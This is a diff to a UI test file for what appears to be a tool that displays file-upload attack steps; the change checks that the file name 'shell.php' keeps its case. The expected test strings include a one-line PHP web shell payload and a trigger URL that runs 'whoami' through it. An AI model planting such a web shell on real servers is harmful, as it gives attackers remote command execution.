@@ -114,7 +114,11 @@ describe("Uploaded file view", () => {
     const { user, d } = await openUploaded();
     await vi.waitFor(() => expect(fitNames(d)).toContain(PHP));
     await user.click(fitRow(d, PHP));
-    expect(await d.findByRole("heading", { name: "Save as shell.php" })).toBeInTheDocument();
+    const heading = await d.findByRole("heading", { name: "Save as shell.php" });
+    // The label style capitalises the words; the file name keeps its case (a Linux name is case-sensitive).
+    const file = heading.querySelector("[data-upload-file]")!;
+    expect(file.textContent).toBe("shell.php");
+    expect(file).toHaveClass("normal-case");
     expect(d.getByLabelText("Command: Payload").textContent).toBe("<?php system($_REQUEST['cmd']); ?>");
     expect(d.getByRole("heading", { name: "Trigger it" })).toBeInTheDocument();
     expect(d.getByLabelText("Command: Trigger").textContent).toBe("http://198.51.100.20/{UPLOAD_PATH}/shell.php?cmd=whoami");
